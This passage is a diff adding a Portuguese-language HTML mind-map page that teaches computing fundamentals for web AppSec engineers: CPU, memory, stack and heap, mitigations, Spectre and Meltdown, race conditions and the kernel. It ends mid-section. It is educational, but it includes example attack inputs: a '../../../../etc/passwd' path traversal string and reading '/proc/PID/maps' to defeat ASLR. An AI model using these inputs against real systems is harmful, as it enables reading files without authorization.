@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Roadmap: Fundamentos para Web AppSec Engineer</title>
+  <meta name="description" content="Fundamentos técnicos para Web AppSec Engineer — computadores, memória, processadores, SO, linguagens e Linux.">
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <header class="site-header">
+    <div class="terminal-bar">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+      <span class="terminal-title">medjay@kemet:~/appsec$ █</span>
+    </div>
+    <div class="header-body">
+      <h1 class="header-title">&#128737; Fundamentos para Web AppSec Engineer</h1>
+      <p class="header-sub">A base técnica que todo profissional de segurança de aplicações precisa dominar</p>
+    </div>
+  </header>
+
+  <main class="mindmap-container">
+
+    <div class="center-node">
+      <div class="center-icon">🕵️</div>
+      <span>Web AppSec</span>
+    </div>
+
+    <div class="branches">
+
+      <!-- ══════════════════════════════════════════════════════ -->
+      <!-- 1. COMO FUNCIONA UM COMPUTADOR                        -->
+      <!-- ══════════════════════════════════════════════════════ -->
+      <div class="branch branch-1">
+        <button class="node node-main" onclick="toggleNode('comp')">
+          <span class="node-icon">&#128187;</span>
+          Como Funciona um Computador
+          <span class="arrow" id="arrow-comp">&#9660;</span>
+        </button>
+        <div class="node-panel" id="comp">
+          <p class="node-desc">
+            Antes de entender como atacar ou defender uma aplicação web, você precisa entender a máquina onde ela roda. Um computador é um sistema de processamento de informação composto por hardware e software que trabalham em camadas. Cada camada tem abstrações que simplificam o acesso à camada de baixo — e cada abstração pode conter vulnerabilidades. Neste vídeo, vamos desmistificar o que acontece desde o momento em que você liga o servidor até a instrução mais simples ser executada pela CPU. Este conhecimento é a fundação para entender ataques como buffer overflow, race condition, side-channel attacks e muito mais.
+          </p>
+          <div class="sub-nodes">
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('comp-cpu')">&#128736; CPU — O Coração de Tudo</button>
+              <div class="sub-panel" id="comp-cpu">
+                <p>
+                  A CPU (Central Processing Unit) é o componente que executa instruções binárias — sequências de 0s e 1s que representam operações matemáticas e lógicas. Ela é composta por: a <strong>Unidade de Controle</strong> (lê e interpreta instruções), a <strong>Unidade Lógica e Aritmética — ALU</strong> (realiza cálculos), os <strong>registradores</strong> (memória ultrarápida dentro da CPU para dados temporários) e o <strong>cache</strong> (buffer entre a CPU e a RAM).
+                </p>
+                <p style="margin-top:10px;">
+                  Para o Web AppSec Engineer, entender a CPU é essencial porque ela é o alvo final de qualquer exploit. Quando um atacante explora um buffer overflow em um servidor web em C, o objetivo é fazer a CPU executar código malicioso redirecionando o ponteiro de instrução (<code>RIP</code>/<code>EIP</code>). Ataques como <strong>ROP (Return-Oriented Programming)</strong> manipulam diretamente o fluxo de execução da CPU encadeando "gadgets" — pequenos trechos de código legítimo já presentes na memória.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Registradores importantes:</strong> <code>RIP</code> (instruction pointer — onde a CPU está executando), <code>RSP</code> (stack pointer — topo da pilha), <code>RBP</code> (base pointer — base do frame atual), <code>RAX/RBX/RCX/RDX</code> (propósito geral). Em um exploit de stack overflow, o objetivo é sobrescrever o <code>RIP</code> salvo na stack para apontar para código do atacante.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('comp-ram')">&#129293; RAM — Memória Volátil e seus Segredos</button>
+              <div class="sub-panel" id="comp-ram">
+                <p>
+                  A RAM (Random Access Memory) é uma memória de acesso aleatório extremamente rápida onde todo programa em execução reside. Ela é <strong>volátil</strong>: quando o computador desliga, todo conteúdo é perdido. Fisicamente, é composta por células de capacitores que armazenam carga elétrica representando bits.
+                </p>
+                <p style="margin-top:10px;">
+                  Uma RAM DDR5 moderna opera a cerca de 4800 MT/s (megatransferências por segundo), enquanto a latência de acesso fica na faixa de 10–70 ns. Compare isso com o cache L1 da CPU (&lt;1 ns) e com um SSD NVMe (~50 µs). Essa diferença de velocidade é a razão pela qual o cache existe — e também a razão pela qual ataques de <strong>cache timing</strong> (como Spectre) funcionam: o atacante mede o tempo de acesso à memória para inferir dados secretos.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Por que isso importa para AppSec:</strong> aplicações web em Node.js, PHP, Python e Java todas têm sua memória mapeada na RAM. Vulnerabilidades de <strong>use-after-free</strong> ocorrem quando um programa acessa RAM que já foi liberada. <strong>Memory leaks</strong> (vazamentos de memória) em aplicações web podem levar a DoS por esgotamento de RAM. A leitura de memória fora dos limites (out-of-bounds read) pode expor dados sigilosos de outros usuários num servidor compartilhado.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('comp-disk')">&#128190; Armazenamento: Onde os Dados Persistem</button>
+              <div class="sub-panel" id="comp-disk">
+                <p>
+                  Ao contrário da RAM, o armazenamento persistente (HDD ou SSD) mantém dados mesmo sem energia. <strong>HDDs</strong> (Hard Disk Drives) usam pratos magnéticos giratórios e uma cabeça de leitura/escrita mecânica — latência na faixa de 5–10 ms. <strong>SSDs</strong> usam chips NAND flash, sem partes mecânicas — latência de ~0,05–0,5 ms para NVMe PCIe.
+                </p>
+                <p style="margin-top:10px;">
+                  Para o contexto de segurança web, o armazenamento é onde ficam: arquivos de configuração (como <code>.env</code>, <code>config.php</code> com credenciais), bancos de dados SQLite, logs de acesso, chaves privadas TLS e muito mais. Ataques de <strong>Path Traversal</strong> (como <code>../../../../etc/passwd</code>) exploram a falta de validação ao acessar o sistema de arquivos. <strong>Local File Inclusion (LFI)</strong> permite que um atacante leia arquivos arbitrários do disco via uma aplicação web vulnerável.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Ponto crítico:</strong> backups mal configurados (arquivos <code>.sql</code>, <code>.tar.gz</code>) deixados em diretórios públicos do servidor web são uma das formas mais comuns de exposição de dados sensíveis — descobertos trivialmente com scanners de conteúdo como <strong>dirbuster</strong> ou <strong>gobuster</strong>.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('comp-bus')">&#128268; Barramento, I/O e a Comunicação Interna</button>
+              <div class="sub-panel" id="comp-bus">
+                <p>
+                  O <strong>barramento</strong> (bus) é o conjunto de trilhas condutoras que conectam CPU, RAM, placa de rede, GPU e periféricos. Existem três tipos: <strong>barramento de dados</strong> (transfere os dados em si), <strong>barramento de endereço</strong> (indica onde na memória ler/escrever) e <strong>barramento de controle</strong> (sinaliza a operação: leitura ou escrita).
+                </p>
+                <p style="margin-top:10px;">
+                  A interface <strong>PCIe</strong> (Peripheral Component Interconnect Express) é o barramento moderno de alta velocidade que conecta GPUs, SSDs NVMe e placas de rede. Uma placa de rede 10GbE conectada via PCIe pode transferir dados direto para a RAM sem passar pela CPU (técnica chamada <strong>DMA — Direct Memory Access</strong>).
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Relevância para AppSec:</strong> ataques de <strong>DMA attack</strong> exploram dispositivos externos com acesso direto à memória para ler credenciais ou chaves criptográficas. Em ambientes de nuvem, o isolamento de DMA entre VMs é crítico para evitar que um tenant leia a memória de outro — um vetor de ataque em hypervisors vulneráveis.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('comp-cycle')">&#9654; O Ciclo Busca–Decodifica–Executa em Detalhes</button>
+              <div class="sub-panel" id="comp-cycle">
+                <p>
+                  Todo programa, seja um servidor web Nginx ou um malware, executa o mesmo ciclo fundamental repetidamente na CPU:
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li><strong>1. Fetch (Busca):</strong> a CPU lê a instrução no endereço apontado pelo registrador <code>RIP</code> (Instruction Pointer) e incrementa <code>RIP</code>.</li>
+                  <li><strong>2. Decode (Decodificação):</strong> a unidade de controle interpreta os bytes da instrução (opcode + operandos).</li>
+                  <li><strong>3. Execute (Execução):</strong> a ALU realiza a operação, ou a CPU acessa memória, ou modifica registradores.</li>
+                  <li><strong>4. Write-back:</strong> o resultado é escrito de volta em um registrador ou na memória.</li>
+                </ul>
+                <p style="margin-top:12px;">
+                  <strong>Por que isso é fundamental para segurança:</strong> toda vulnerabilidade de execução de código (RCE — Remote Code Execution) busca, no fundo, inserir bytes maliciosos na memória e redirecionar o <code>RIP</code> para eles. Proteções como <strong>DEP/NX</strong> (Data Execution Prevention) marcam regiões de memória como não-executáveis para impedir isso. <strong>ASLR</strong> (Address Space Layout Randomization) aleatoriza os endereços de memória para dificultar que o atacante saiba para onde redirecionar o <code>RIP</code>. Entender o ciclo de execução é o pré-requisito para entender como essas proteções funcionam — e como são contornadas.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('comp-boot')">&#128274; Boot, BIOS/UEFI e a Cadeia de Confiança</button>
+              <div class="sub-panel" id="comp-boot">
+                <p>
+                  Quando você liga um servidor, o processo de boot define quem controla a máquina. A sequência é: <strong>UEFI/BIOS</strong> → <strong>Bootloader</strong> (GRUB) → <strong>Kernel</strong> → <strong>Init (systemd)</strong> → serviços e aplicações.
+                </p>
+                <p style="margin-top:10px;">
+                  O <strong>Secure Boot</strong> (UEFI) verifica assinaturas criptográficas de cada componente antes de carregá-lo, criando uma <em>cadeia de confiança</em>. Se um atacante compromete o bootloader (bootkits), ele obtém persistência profundíssima — o malware roda antes do próprio sistema operacional, tornando-se praticamente invisível.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Para Web AppSec:</strong> em ambientes de nuvem e containers, o boot é abstraído. Mas conhecer a cadeia de confiança é essencial para entender <strong>supply chain attacks</strong> (ataques à cadeia de suprimentos de software), que comprometem componentes cedo no pipeline de build/deploy — muito antes do código chegar ao servidor de produção.
+                </p>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+      <!-- ══════════════════════════════════════════════════════ -->
+      <!-- 2. PROGRAMAS NA MEMÓRIA                               -->
+      <!-- ══════════════════════════════════════════════════════ -->
+      <div class="branch branch-2">
+        <button class="node node-main" onclick="toggleNode('mem')">
+          <span class="node-icon">&#128200;</span>
+          Como os Programas Rodam na Memória
+          <span class="arrow" id="arrow-mem">&#9660;</span>
+        </button>
+        <div class="node-panel" id="mem">
+          <p class="node-desc">
+            Quando você faz deploy de uma aplicação web, o sistema operacional cria um <em>processo</em> — um espaço de memória isolado onde seu código vive. Entender como esse espaço é organizado é absolutamente crítico para qualquer profissional de segurança. A maioria das vulnerabilidades críticas de aplicações — buffer overflow, heap spray, use-after-free, format string — explora diretamente a forma como a memória é organizada e gerenciada. Neste vídeo, vamos "abrir o capô" de um processo em execução e entender cada região de memória, como a stack e o heap funcionam em detalhes, e por que linguagens diferentes têm perfis de vulnerabilidade completamente diferentes.
+          </p>
+          <div class="sub-nodes">
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('mem-layout')">&#128204; O Mapa de Memória de um Processo</button>
+              <div class="sub-panel" id="mem-layout">
+                <p>
+                  Todo processo Linux tem um espaço de endereçamento virtual dividido em regiões distintas (visível com <code>cat /proc/PID/maps</code>):
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li><strong>.text (código):</strong> instruções compiladas do programa. Normalmente somente-leitura e executável (NX bit). Um atacante que consegue escrever aqui pode injetar shellcode.</li>
+                  <li><strong>.data / .bss:</strong> variáveis globais e estáticas inicializadas e não-inicializadas.</li>
+                  <li><strong>Heap:</strong> cresce "para cima" a partir de um endereço base. Gerenciado pelo alocador (<code>malloc</code>/<code>free</code>). Fonte de vulnerabilidades de heap.</li>
+                  <li><strong>Memory-mapped files:</strong> bibliotecas compartilhadas (.so/.dll) mapeadas aqui — inclui libc, OpenSSL, etc.</li>
+                  <li><strong>Stack:</strong> cresce "para baixo" desde o topo do espaço de endereços. Gerencia chamadas de funções.</li>
+                </ul>
+                <p style="margin-top:10px;">
+                  <strong>Para AppSec:</strong> o comando <code>cat /proc/PID/maps</code> num servidor comprometido revela toda a estrutura de memória de um processo — incluindo onde as bibliotecas estão carregadas. Isso é exatamente o que um atacante usa para calcular endereços em exploits que contornam ASLR via info leak.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('mem-stack')">&#9650; Stack (Pilha) — A Origem dos Buffer Overflows</button>
+              <div class="sub-panel" id="mem-stack">
+                <p>
+                  A stack é uma estrutura de dados LIFO (Last In, First Out) usada para gerenciar o fluxo de execução de funções. Cada vez que uma função é chamada, um <strong>stack frame</strong> é criado no topo da pilha contendo:
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li>Os <strong>argumentos</strong> passados para a função</li>
+                  <li>O <strong>endereço de retorno</strong> (para onde a CPU vai voltar depois que a função terminar)</li>
+                  <li>O <strong>saved RBP</strong> (ponteiro de base do frame anterior)</li>
+                  <li>As <strong>variáveis locais</strong> da função</li>
+                </ul>
+                <p style="margin-top:10px;">
+                  O <strong>Stack Buffer Overflow</strong> é o exploit clássico: se uma função copia dados para um buffer local sem verificar o tamanho, um atacante pode enviar dados além do limite do buffer, sobrescrevendo o endereço de retorno. Quando a função termina, a CPU pula para o endereço do atacante em vez de voltar ao código legítimo.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Proteções modernas:</strong> <strong>Stack Canaries</strong> colocam um valor aleatório entre as variáveis locais e o endereço de retorno — se for sobrescrito, o programa aborta. <strong>ASLR</strong> randomiza o endereço base da stack. <strong>SafeStack</strong> (Clang/LLVM) separa stacks seguras de inseguras. Para web: funções em C como <code>strcpy()</code>, <code>gets()</code>, <code>sprintf()</code> sem limites são a raiz do problema — por isso linguagens modernas como Rust são memory-safe por padrão.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('mem-heap')">&#9651; Heap — Alocação Dinâmica e seus Perigos</button>
+              <div class="sub-panel" id="mem-heap">
+                <p>
+                  O heap é a região de memória para alocação dinâmica — quando você não sabe em compile-time quanto espaço vai precisar. Em C, <code>malloc(size)</code> pede ao sistema <code>size</code> bytes no heap; <code>free(ptr)</code> devolve. O gerenciador de heap (como <strong>ptmalloc</strong> no glibc) mantém listas de blocos livres e ocupados com metadados nos próprios headers dos blocos.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Vulnerabilidades de heap são algumas das mais exploradas no mundo real:</strong>
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li><strong>Use-After-Free (UAF):</strong> usar um ponteiro após liberar a memória. A memória pode ter sido realocada para outro objeto — um atacante pode controlar o conteúdo novo para forçar comportamento malicioso.</li>
+                  <li><strong>Heap Buffer Overflow:</strong> escrever além dos limites de um bloco, corrompendo os metadados do bloco adjacente.</li>
+                  <li><strong>Double-Free:</strong> liberar o mesmo ponteiro duas vezes, corrompendo as estruturas internas do heap.</li>
+                  <li><strong>Heap Spray:</strong> inundar o heap com shellcode para aumentar a probabilidade de um ponteiro apontar para código do atacante.</li>
+                </ul>
+                <p style="margin-top:10px;">
+                  Em aplicações web modernas (JavaScript/Node.js, PHP, Java), o garbage collector elimina UAF e double-free — mas introduz novos vetores como <strong>prototype pollution</strong> (JavaScript) e <strong>deserialization attacks</strong> que manipulam objetos no heap.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('mem-virtual')">&#128249; Memória Virtual, Paginação e Isolamento</button>
+              <div class="sub-panel" id="mem-virtual">
+                <p>
+                  Cada processo acredita que tem acesso exclusivo a um espaço de endereçamento enorme (2⁶⁴ bytes no x86-64). Isso é uma ilusão criada pelo SO e pelo hardware: a <strong>MMU</strong> (Memory Management Unit) traduz endereços <em>virtuais</em> para endereços <em>físicos</em> usando uma estrutura chamada <strong>Page Table</strong>.
+                </p>
+                <p style="margin-top:10px;">
+                  A memória é dividida em <strong>páginas</strong> (normalmente 4 KB). Cada página tem atributos: leitura, escrita, execução (o <strong>NX bit</strong> — No-Execute). Se um processo tenta executar código numa página marcada como não-executável (heap, stack com NX), a CPU lança uma exceção — impedindo shellcode injetado direto na memória.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Meltdown e Spectre</strong> (2018) quebraram o isolamento entre processos e entre espaço de usuário/kernel explorando execução especulativa da CPU — permitindo leitura de memória fora dos limites através de um canal lateral de timing do cache. Servidores web em nuvem que rodam código de múltiplos tenants na mesma CPU física foram os mais afetados.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('mem-protect')">&#128737; Proteções de Memória: DEP, ASLR, PIE, Canary</button>
+              <div class="sub-panel" id="mem-protect">
+                <p>
+                  Décadas de exploits de memória levaram ao desenvolvimento de mitigações em camadas. Entender cada uma é essencial para o Web AppSec Engineer — tanto para saber quando uma aplicação está protegida quanto para entender os bypasses:
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li><strong>DEP/NX (Data Execution Prevention):</strong> marca heap e stack como não-executáveis. Bypass: ROP chains executam código legítimo já existente.</li>
+                  <li><strong>ASLR (Address Space Layout Randomization):</strong> randomiza endereços de base. Bypass: info leaks revelam endereços reais; força bruta em sistemas 32-bit.</li>
+                  <li><strong>PIE (Position Independent Executable):</strong> o próprio binário é carregado em endereço aleatório (requer ASLR + PIE juntos para máxima eficácia).</li>
+                  <li><strong>Stack Canary:</strong> valor aleatório verificado antes de cada retorno de função. Bypass: info leak do canary ou sobrescrita sem passar pelo canary.</li>
+                  <li><strong>RELRO (Relocation Read-Only):</strong> torna a GOT (Global Offset Table) somente-leitura após o link, impedindo overwrites de ponteiros de funções.</li>
+                  <li><strong>SafeStack / Shadow Stack (CET):</strong> mantém uma cópia protegida dos endereços de retorno. Intel CET (Control Enforcement Technology) implementa isso em hardware.</li>
+                </ul>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('mem-gc')">&#9851; Garbage Collection e Segurança em Linguagens Modernas</button>
+              <div class="sub-panel" id="mem-gc">
+                <p>
+                  Linguagens com <strong>garbage collector</strong> (Java, Python, Go, JavaScript, C#) eliminam automaticamente as classes mais tradicionais de vulnerabilidades de memória (UAF, double-free) porque o GC decide quando liberar objetos — o programador não gerencia memória diretamente.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Rust</strong> vai além: sem GC, usa um sistema de <em>ownership</em> e <em>borrow checker</em> que garante memory safety em compile-time. É a razão pela qual Rust é cada vez mais adotado em componentes críticos de segurança (kernels, navegadores, firewalls).
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Mas atenção:</strong> GC não elimina todas as vulnerabilidades. Em Python/PHP/Java ainda existe: <strong>SQL Injection</strong> (não é problema de memória, é de validação), <strong>deserialization</strong> (permite execução arbitrária ao reconstruir objetos), <strong>prototype pollution</strong> (JavaScript), e <strong>memory leaks</strong> por referências esquecidas que enganam o GC. A classe de vulnerabilidade muda — não desaparece.
+                </p>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+      <!-- ══════════════════════════════════════════════════════ -->
+      <!-- 3. COMO PROCESSADORES FUNCIONAM                       -->
+      <!-- ══════════════════════════════════════════════════════ -->
+      <div class="branch branch-3">
+        <button class="node node-main" onclick="toggleNode('cpu')">
+          <span class="node-icon">&#9729;</span>
+          Como Processadores Funcionam
+          <span class="arrow" id="arrow-cpu">&#9660;</span>
+        </button>
+        <div class="node-panel" id="cpu">
+          <p class="node-desc">
+            A CPU moderna é uma das engenharias mais complexas da humanidade. Para extrair máximo desempenho, processadores modernos implementam dezenas de técnicas avançadas — pipeline, execução fora de ordem, execução especulativa, branch prediction, cache hierárquico. O problema é que cada uma dessas otimizações pode criar vulnerabilidades de segurança. As famosas falhas <strong>Spectre e Meltdown</strong> (2018) exploram exatamente essas otimizações. Para o Web AppSec Engineer, entender o processador permite compreender ataques de timing, side-channels e por que certas operações criptográficas precisam ser implementadas de forma tão cuidadosa.
+          </p>
+          <div class="sub-nodes">
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('cpu-isa')">&#128220; ISA — A Linguagem Nativa da CPU</button>
+              <div class="sub-panel" id="cpu-isa">
+                <p>
+                  A <strong>ISA</strong> (Instruction Set Architecture) é o contrato entre software e hardware: define o conjunto de instruções que a CPU entende, os registradores disponíveis, os modos de endereçamento e o comportamento de cada instrução. É a linguagem que o compilador usa para traduzir seu código de alto nível.
+                </p>
+                <p style="margin-top:10px;">
+                  As duas ISAs dominantes hoje são:
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li><strong>x86-64 (AMD64):</strong> CISC (Complex Instruction Set Computer). Instruções de tamanho variável, altamente complexa. Domina servidores (Intel Xeon, AMD EPYC) e desktops. A maioria dos exploits de aplicações web em produção roda em x86-64.</li>
+                  <li><strong>ARM64 (AArch64):</strong> RISC (Reduced Instruction Set Computer). Instruções de tamanho fixo, mais simples. Domina mobile (Android/iOS) e ganha tração em servidores (AWS Graviton, Apple Silicon).</li>
+                </ul>
+                <p style="margin-top:10px;">
+                  <strong>Para AppSec:</strong> shellcode e exploits são específicos de arquitetura. Um exploit x86-64 não roda em ARM. Entender a ISA é necessário para ler disassembly de binários suspeitos, analisar malware e desenvolver exploits em CTFs de binary exploitation.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('cpu-pipeline')">&#128299; Pipeline e Execução Fora de Ordem</button>
+              <div class="sub-panel" id="cpu-pipeline">
+                <p>
+                  O <strong>pipeline</strong> divide a execução de uma instrução em múltiplos estágios que operam em paralelo — como uma linha de montagem. Um pipeline de 5 estágios clássico: <em>Fetch → Decode → Execute → Memory → Write-back</em>. Enquanto a instrução #1 está em Execute, a instrução #2 já está em Decode e a #3 em Fetch.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Execução fora de ordem (Out-of-Order Execution / OoOE):</strong> CPUs modernas (Intel Core, AMD Zen) analisam um "janela" de instruções à frente e reordenam sua execução para maximizar uso das unidades funcionais, respeitando as dependências de dados. A ordem é preservada apenas na visão do programador — internamente é caos organizado.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Branch Prediction:</strong> a CPU tenta adivinhar o resultado de desvios condicionais (<code>if</code>) e executa o caminho mais provável especulativamente. Se errar, descarta os resultados (flush do pipeline) — mas o cache já foi modificado. Isso é a base do <strong>Spectre Variant 1</strong>: um atacante pode fazer a CPU executar código especulativamente que acessa memória proibida, e inferir o resultado pelo timing do cache — mesmo que a execução seja "descartada".
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('cpu-cache')">&#9889; Cache Hierárquico e Ataques de Timing</button>
+              <div class="sub-panel" id="cpu-cache">
+                <p>
+                  A hierarquia de cache existe para compensar a enorme diferença de velocidade entre CPU e RAM:
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li><strong>L1 (por core):</strong> ~32-64 KB, latência ~1-4 ciclos (&lt;1 ns). Dados e instruções.</li>
+                  <li><strong>L2 (por core):</strong> ~256 KB–1 MB, latência ~10-20 ciclos (~5 ns).</li>
+                  <li><strong>L3 (compartilhado):</strong> ~4–64 MB, latência ~40-80 ciclos (~20-40 ns).</li>
+                  <li><strong>RAM:</strong> latência ~100-200 ciclos (~50-100 ns).</li>
+                </ul>
+                <p style="margin-top:10px;">
+                  <strong>Ataques de cache timing</strong> exploram essa diferença medindo o tempo de acesso à memória. Se um acesso a um endereço é rápido (~5 ns), o dado estava no cache. Se é lento (~100 ns), não estava. Isso permite inferir padrões de acesso de outros processos.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Flush+Reload, Prime+Probe, Evict+Time</strong> são técnicas de side-channel baseadas em cache usadas para extrair chaves AES, RSA e outros segredos criptográficos. Para implementações seguras de criptografia, o tempo de execução não deve depender dos dados secretos — isso é chamado de <em>constant-time programming</em> e é exigido em bibliotecas como OpenSSL.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('cpu-spectre')">&#128682; Spectre e Meltdown: Quando o Hardware é Vulnerável</button>
+              <div class="sub-panel" id="cpu-spectre">
+                <p>
+                  Reveladas em janeiro de 2018 por pesquisadores do Google Project Zero, Spectre e Meltdown são vulnerabilidades fundamentais no design de CPUs modernas — afetando praticamente toda CPU fabricada desde 1995.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Meltdown (CVE-2017-5754):</strong> explorava a execução fora de ordem para ler memória do kernel a partir do espaço de usuário. Um processo sem privilégios podia ler qualquer endereço físico de memória, incluindo memória de outros processos e do kernel. Correção: <strong>KPTI</strong> (Kernel Page-Table Isolation) — separa completamente as page tables de kernel e usuário, com custo de performance de até 30%.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Spectre (CVE-2017-5753/5715):</strong> mais difícil de corrigir. Explora branch prediction para vazar informações entre processos. Afeta Chrome (via JavaScript), VMs em nuvem e praticamente qualquer sistema. Mitigações como <strong>Retpoline</strong>, <strong>IBRS</strong>, <strong>microcode updates</strong> reduzem mas não eliminam completamente o risco.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Impacto para Web AppSec:</strong> um script JavaScript malicioso numa página web pode explorar Spectre para ler memória do navegador — incluindo cookies, tokens de autenticação e senhas. Isso levou à redução da resolução de <code>performance.now()</code> e desativação de SharedArrayBuffer em navegadores.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('cpu-cores')">&#128101; Concorrência, Threads e Race Conditions</button>
+              <div class="sub-panel" id="cpu-cores">
+                <p>
+                  CPUs modernas têm múltiplos núcleos físicos, cada um capaz de executar threads independentemente. <strong>Hyper-Threading</strong> (Intel) / <strong>SMT</strong> (AMD) duplica núcleos lógicos por core físico, compartilhando recursos de execução.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Race Condition (Condição de Corrida)</strong> é uma vulnerabilidade que ocorre quando dois ou mais threads acessam recursos compartilhados sem sincronização adequada, e o resultado depende da ordem de execução. Em aplicações web: uma race condition no processo de pagamento pode permitir que um usuário compre um item pagando apenas uma vez enquanto o servidor credita múltiplas vezes. Ou em sistemas de autenticação: múltiplas requisições simultâneas para trocar a senha podem resultar em estado inconsistente.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>TOCTOU (Time-of-Check Time-of-Use):</strong> uma classe específica de race condition onde um recurso é verificado numa condição e usado em outra, com uma janela de tempo entre os dois onde um atacante pode modificar o recurso. Exemplo clássico em segurança: checar se um arquivo existe antes de abrir — entre o check e o open, o atacante substitui o arquivo por um symlink para <code>/etc/passwd</code>.
+                </p>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+      <!-- ══════════════════════════════════════════════════════ -->
+      <!-- 4. SISTEMAS OPERACIONAIS                              -->
+      <!-- ══════════════════════════════════════════════════════ -->
+      <div class="branch branch-4">
+        <button class="node node-main" onclick="toggleNode('os')">
+          <span class="node-icon">&#128421;</span>
+          Sistemas Operacionais
+          <span class="arrow" id="arrow-os">&#9660;</span>
+        </button>
+        <div class="node-panel" id="os">
+          <p class="node-desc">
+            O sistema operacional é o intermediário entre o hardware e as aplicações — e é também um dos alvos mais críticos de ataques. Todo servidor web roda sobre um SO, e entender como ele gerencia processos, memória, arquivos e rede é essencial para qualquer profissional de segurança. Neste vídeo, vamos explorar como o kernel funciona, o que são system calls e por que elas importam para segurança, como o SO isola processos, como ele gerencia permissões, e como vulnerabilidades no kernel podem comprometer completamente um sistema — mesmo quando a aplicação web em cima está "segura".
+          </p>
+          <div class="sub-nodes">
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('os-kernel')">&#128170; Kernel: Espaço de Usuário vs. Espaço de Kernel</button>
+              <div class="sub-panel" id="os-kernel">
+                <p>
+                  O kernel Linux opera em dois níveis de privilégio distintos definidos pelo hardware (rings do x86):
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li><strong>Ring 0 — Kernel Space:</strong> código com acesso irrestrito ao hardware. O kernel, drivers e módulos rodam aqui. Um bug aqui compromete todo o sistema.</li>
+                  <li><strong>Ring 3 — User Space:</strong> onde suas aplicações rodam. Acesso ao hardware é mediado pelo kernel via system calls. Um crash aqui afeta apenas aquele processo.</li>
+                </ul>
+                <p style="margin-top:10px;">
+                  <strong>Vulnerabilidades de kernel</strong> (privilege escalation) permitem que um processo em Ring 3 execute código em Ring 0, obtendo controle total do sistema. Exemplos famosos: <strong>Dirty COW</strong> (CVE-2016-5195) — race condition no kernel Linux que permitia escrita em arquivos somente-leitura; <strong>DirtyPipe</strong> (CVE-2022-0847) — similar, explorava pipes do Linux para sobrescrever arquivos arbitrários, incluindo binários SUID como <code>/usr/bin/passwd</code>.
+                </p>
+                <p style="margin-top:10px;">
+                  Para Web AppSec: mesmo que sua aplicação web seja perfeita, um kernel vulnerável no servidor pode ser explorado via Local Privilege Escalation depois que um atacante obtém uma shell (ex: via RCE na aplicação).
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('os-syscall')">&#128222; System Calls: A Interface com o Kernel</button>
+              <div class="sub-panel" id="os-syscall">
+                <p>
+                  Toda vez que uma aplicação precisa fazer algo que envolve o hardware ou recursos compartilhados, ela faz uma <strong>system call</strong> — uma chamada controlada para o kernel. No Linux, existem ~400 syscalls. As mais relevantes para segurança:
